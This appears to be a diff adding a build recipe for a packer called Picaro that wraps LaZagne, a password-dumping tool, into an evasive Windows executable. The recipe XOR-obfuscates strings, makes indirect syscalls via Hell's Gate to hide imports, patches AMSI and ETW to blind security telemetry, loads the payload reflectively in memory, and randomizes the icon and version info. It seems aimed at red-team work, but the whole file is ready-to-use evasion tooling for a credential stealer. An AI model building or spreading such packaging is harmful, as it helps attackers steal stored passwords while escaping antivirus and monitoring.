@@ -1,0 +1,40 @@
+# LaZagne.exe (x64) packed with Picaro.
+#
+# LaZagne is flat native code, so `reflective_loading` maps it into the loader's
+# own process. It is a PE executable, so the step is terminal (the payload calls
+# `ExitProcess`) and goes last.
+#
+#   picaro build Lazagne.yml
+#   .\dist\LaZagne.picaro.exe
+
+schema: 6
+name: lazagne
+
+build:
+  payloads:
+    lazagne:
+      source: "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
+
+  stub:
+    strings:
+      strategy: xor
+    # Resolve the Nt* SSNs at runtime and enter the kernel through ntdll's own
+    # `syscall; ret` gadget, so no Nt*/Virtual* import is left in the IAT.
+    syscalls:
+      mode: indirect
+      resolver: hells_gate
+
+  output:
+    path: ./dist/LaZagne.picaro.exe
+    resources:
+      icon: random
+      version_info:
+        randomize: true
+    sign:
+      mode: lab
+
+runtime:
+  - technique: patch_amsi
+  - technique: patch_etw
+  - technique: reflective_loading
+    params: { payload: lazagne }
